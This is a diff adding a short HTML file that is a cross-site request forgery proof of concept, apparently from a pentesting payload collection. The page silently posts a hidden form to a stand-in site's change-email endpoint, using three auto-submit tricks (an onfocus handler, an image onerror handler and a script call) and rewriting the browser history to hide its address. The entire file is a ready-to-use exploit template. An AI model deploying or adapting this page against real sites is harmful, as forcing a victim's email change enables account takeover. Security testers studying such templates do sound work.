@@ -1,0 +1,13 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form method="POST" action="https://victim.net/email/change-email" id="csrfform">
+      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
+      <input type="submit" value="Submit request" />
+      <img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
+    </form>
+    <script>
+      document.forms[0].submit(); //Way 3 to autosubmit
+    </script>
+  </body>
+</html>
